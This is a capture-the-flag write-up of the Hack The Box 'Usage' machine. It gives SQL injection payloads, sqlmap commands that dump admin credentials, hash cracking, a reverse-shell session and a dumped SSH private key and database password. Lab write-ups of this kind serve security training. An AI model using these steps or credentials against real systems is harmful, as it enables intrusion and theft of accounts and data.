# ROOM
Usage from HTB :)
I want to write  this writeup in english this time :)

# Information gathering
This is a website, with login, register and admin page.

As we can see in cookie, it using laravel. And that all.
# Enumeration
## Nmap
We're gonna scan the attack surface using nmap
```
nmap -sC -sV $TARGET -p -o nmap.txt
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 04:00 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for usage.htb (10.10.11.18)
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Daily Blogs
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.50 seconds
```
## Wfuzz
Using wfuzz, we can see they have only 1 avaible subdomain
```
wfuzz -c -u http://usage.htb -H "Host: FUZZ.usage.htb" -w /home/kali/Wordlist/subdomains-top1million-5000.txt --hc 301
```
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://usage.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000000024:   200        88 L     226 W      3304 Ch     "admin"                                                                                               

Total time: 12.70573
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 392.6572
```
## Manual search
After trying multiple things, i found a field vulnerable to SQL injection in reset password page.
This payload :
```
bleh@bleh.com' AND 1=1;-- -
```
Return :
```
We have e-mailed your password reset link to bleh@bleh.com' AND 1=1;-- - 
```
Wich means its vulnerable.

# Exploitation
With SQL Map, we're gonna try to exploit the SQL injection to get some credentials or other usefull stuff.

I catch the request using burpsuite:
```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6IlI1T3JPcXY3M213Y3ZYdzg3V2gvM3c9PSIsInZhbHVlIjoiVllIVGUvclV3ajZ6dnREc2xLVHNrMGNuMERHSS8rc0tzdmwzb2YybFBzVkM5N29NYTVwVHMzdGVpYmU4VkpYSjlCaFQrSGRvTlVhWk5ma1liZzAvRDFjMzN3R3djeXBZTXI0c0RIbXgyMTZMU0ROVkVVdUgwemZNT21XYnZESlEiLCJtYWMiOiI4MmEzZWViZDYzMjVlNWUyMTgxYTY1ZmFkODExODQ3MGEyYzE4Y2M4MzEwN2ViMjE1NDgxNjEwNDRiMGU3NmQxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik8va1UrVWFQSVZUeE40aDRkbTNZZXc9PSIsInZhbHVlIjoiTFNUd1VScDhNZmJSQXAxaTRiR2t3NktSaTYzQXk0M0pEa0pGUjJFc2VrOTNYOTcyU0ZFU3JLVTRPWnQreGgva01zRDZQNlBmZnlqRUJQY25jMUNwdzkwUDZ4V01xNFptUlA2RSs3WFUydFg2d2xPT292Rm5zdklkZ0h2TXJoQVUiLCJtYWMiOiIxNjgwZGYwMTQzMTY3OWY3ZWUzYzJkMWVlMWZiM2ExZThiMGUxOTM3OGE0MGI0ZGI5MjE1NDAzZjFhZmVlMTA1IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=hK2lIyI4ojEn9lACt8ogdKKBepGlCFp0WaEC5Ssh&email=test
```
Save it to file (like req.txt) then use sqlmap. Its a challenge, so we dont care about the risk or other sneaky parameters.
```
sqlmap -r req.txt -p email -bash --dump-all
```
It found some usefull stuff but it can't dump the admin_users :
```
[08:55:07] [ERROR] unable to retrieve the number of columns for table 'admin_users' in database 'usage_blog'
[08:55:07] [WARNING] unable to retrieve column names for table 'admin_users' in database 'usage_blog'
[08:55:07] [WARNING] unable to enumerate the columns for table 'admin_users' in database 'usage_blog'
```
We're gonna try to dump **admin_users**, i added --dbms to be more accurate because now we knew it use MySQL.
```
sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users --dump
```
```
+----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
```
We have a token. But no password. We're gonna try to get the password column now
```
sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users -C password --dump
```
```
+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+--------------------------------------------------------------+
```
Finally !
Now, we need to crack it.
```
john --wordlist=/home/kali/Wordlist/rockyou.txt hash  
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:11 DONE (2024-04-29 09:57) 0.08888g/s 144.0p/s 144.0c/s 144.0C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
So, here the admin account we found:
```
Administrator
whatever1
```
This account doesnt work on login page nor admin login page.
I need to do more search on MySQL.

i finally found the right user :
```
Admin
whatever1
```
i have now acces to the admin page. 
We can see the dependencies used:
```
php 	^8.1
encore/laravel-admin 	1.8.18
guzzlehttp/guzzle 	^7.2
laravel/framework 	^10.10
laravel/sanctum 	^3.2
laravel/tinker 	^2.8
symfony/filesystem 	^6.3
```
After a quick google search, we found an [Arbitrary Code Execution](https://flyd.uk/post/cve-2023-24249/)

Now, we have the shell !

```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/Usage]
└─$ nc -lnvp 4444                       
listening on [any] 4444 ...
connect to [10.10.14.173] from (UNKNOWN) [10.10.11.18] 56150
Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:19:42 up 9 min,  0 users,  load average: 0.23, 0.28, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(dash) gid=1000(dash) groups=1000(dash)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
dash@usage:/$
```
# Post exploit
We found the first flag. Now we need to root the machine !
You can find the flag here : **/home/dash/user.txt**

I found an SSH key in **/home/dash**
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----
```
The DB password:
```
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
```
